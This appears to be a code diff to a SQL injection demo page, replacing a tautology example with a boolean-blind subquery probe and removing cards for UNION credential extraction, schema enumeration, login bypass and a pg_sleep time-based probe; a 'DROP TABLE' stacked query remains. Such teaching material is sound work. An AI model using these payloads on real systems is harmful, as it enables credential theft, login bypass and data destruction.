@@ -98,10 +98,11 @@
       <div class="examples-grid">
 
         <div class="example-item clickable" data-fill="search"
-             data-payload="' OR '1'='1" onclick="handleExampleClick(this)">
-          <div class="example-target">Search — tautology</div>
-          <code>' OR '1'='1</code>
-          <div class="example-effect">WHERE becomes always true — returns all rows</div>
+             data-payload="' AND (SELECT 'x' FROM users WHERE username='admin')='x' --"
+             onclick="handleExampleClick(this)">
+          <div class="example-target">Search — subquery probe</div>
+          <code>' AND (SELECT 'x' FROM users WHERE username='admin')='x' --</code>
+          <div class="example-effect">Boolean blind — products appear only if admin exists, leaking info via result presence, not content</div>
         </div>
 
         <div class="example-item clickable" data-fill="login"
@@ -116,44 +117,6 @@
           <div class="example-target">Contact — stacked query</div>
           <code>x'); DROP TABLE messages; --</code>
           <div class="example-effect">Injects a second statement to drop a table</div>
-        </div>
-
-        <div class="example-item clickable" data-fill="search"
-             data-payload="' UNION SELECT id,username,password,role FROM users --"
-             onclick="handleExampleClick(this)">
-          <div class="example-target">Search — UNION extraction</div>
-          <code>' UNION SELECT id,username,password,role FROM users --</code>
-          <div class="example-effect">Reads credentials from another table</div>
-        </div>
-
-        <div class="example-item clickable" data-fill="search"
-             data-payload="' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables --"
-             onclick="handleExampleClick(this)">
-          <div class="example-target">Search — schema enumeration</div>
-          <code>' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables --</code>
-          <div class="example-effect">Lists all tables in the database</div>
-        </div>
-
-        <div class="example-item clickable" data-fill="login"
-             data-payload="' OR 1=1 --" onclick="handleExampleClick(this)">
-          <div class="example-target">Login — OR bypass</div>
-          <code>' OR 1=1 --</code>
-          <div class="example-effect">Logs in as the first user without knowing any password</div>
-        </div>
-
-        <div class="example-item clickable" data-fill="chat"
-             data-payload="hello'); SELECT pg_sleep(4); --" onclick="handleExampleClick(this)">
-          <div class="example-target">Chat — time-based blind</div>
-          <code>hello'); SELECT pg_sleep(4); --</code>
-          <div class="example-effect">Causes a 4-second delay — confirms injection without visible output</div>
-        </div>
-
-        <div class="example-item clickable" data-fill="search"
-             data-payload="' AND (SELECT 'x' FROM users WHERE username='admin')='x' --"
-             onclick="handleExampleClick(this)">
-          <div class="example-target">Search — subquery probe</div>
-          <code>' AND (SELECT 'x' FROM users WHERE username='admin')='x' --</code>
-          <div class="example-effect">Boolean blind — silently confirms a user exists</div>
         </div>
 
       </div>
